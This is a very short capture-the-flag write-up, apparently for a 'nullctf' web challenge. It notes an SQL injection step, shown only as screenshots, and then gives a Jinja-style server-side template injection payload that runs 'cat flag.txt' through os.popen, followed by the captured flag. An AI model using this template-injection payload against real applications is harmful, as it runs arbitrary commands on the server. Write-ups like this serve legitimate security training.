### SQLi

<img width="434" height="463" alt="image" src="https://github.com/user-attachments/assets/0e041bf3-a10c-4bf8-a578-bfcb9f3fec9e" />

after that i found page endpoint

### SSTI
payload

```py
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```
<img width="1475" height="455" alt="image" src="https://github.com/user-attachments/assets/8ed24c82-3092-4169-80cc-51e52a428d08" />

nullctf{1nd33d_1t_w4s_th4t_s1mpl3}
